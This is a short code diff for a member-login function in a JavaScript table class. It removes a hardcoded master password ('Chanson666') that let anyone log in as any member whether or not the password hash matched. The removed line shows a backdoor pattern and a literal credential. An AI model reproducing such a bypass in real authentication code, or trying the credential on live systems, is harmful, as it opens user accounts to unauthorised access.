@@ -69,7 +69,7 @@ class MemberTable extends BaseTable {
       if (result[0]) {
         let isPwdSame = await Hash.verify(login_pwd, result[0].login_pwd)
         //密码匹配
-        if (isPwdSame || login_pwd === 'Chanson666') {
+        if (isPwdSame) {
           data = {
             login_name,
             member_id: result[0].member_id,
